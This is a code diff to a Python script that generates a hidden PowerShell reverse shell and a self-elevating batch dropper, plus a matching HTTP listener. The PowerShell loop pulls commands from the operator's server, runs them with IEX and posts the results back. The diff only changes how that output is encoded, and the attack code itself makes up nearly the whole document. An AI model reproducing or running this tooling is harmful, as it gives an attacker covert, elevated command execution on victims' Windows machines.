@@ -5,7 +5,7 @@ PORT = 8000
 
 GREEN = '\033[38;5;47m'; END = '\033[0m'
 
-payload = f"& {{while ($true){{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body $c}}}}"
+payload = f"& {{while ($true){{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($c) -join ' ')}}}}"
 print(f"{GREEN}TESTE- RAWPAYLOAD:{END}")
 print("")
 print("powershell -W hidden {" +payload+"}")
@@ -22,7 +22,7 @@ f.write(") else (\n")
 f.write(f"  powershell -Command \"Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs\" && exit\n")
 f.write(")\n")
 f.write(":start\n")
-f.write(f"powershell -NoProfile -ExecutionPolicy Bypass -W hidden -Command \"& {{while ($true) {{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body $c}}}}\"\n")
+f.write(f"powershell -NoProfile -ExecutionPolicy Bypass -W hidden -Command \"& {{while ($true) {{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($c) -join ' ')}}}}\"\n")
 f.close()
 
 class Http_Shell(http.server.BaseHTTPRequestHandler):
@@ -36,8 +36,10 @@ class Http_Shell(http.server.BaseHTTPRequestHandler):
     def do_POST(self):
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
-        print(post_data.decode())
-
+        byte_list = [int(b) for b in post_data.split()]
+        byte_seq = bytes(byte_list)
+        print(byte_seq.decode('utf-8'))
+        
     def log_message(self, format, *args):
         return
 
